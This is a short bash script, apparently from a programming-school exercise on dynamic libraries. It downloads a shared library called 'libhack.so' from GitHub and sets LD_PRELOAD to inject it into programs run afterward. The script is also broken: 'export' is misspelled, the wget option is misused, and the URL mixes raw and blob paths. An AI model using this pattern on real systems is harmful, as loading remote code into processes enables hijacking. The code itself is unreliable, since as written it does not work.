#!/bin/bash
wget -p .. https://raw.githubusercontent.com/santaETH/alx-low_level_programming/blob/master/0x18-dynamic_libraries/libhack.so
expoert LD_PRELOAD="$PWD/../libhack.so"
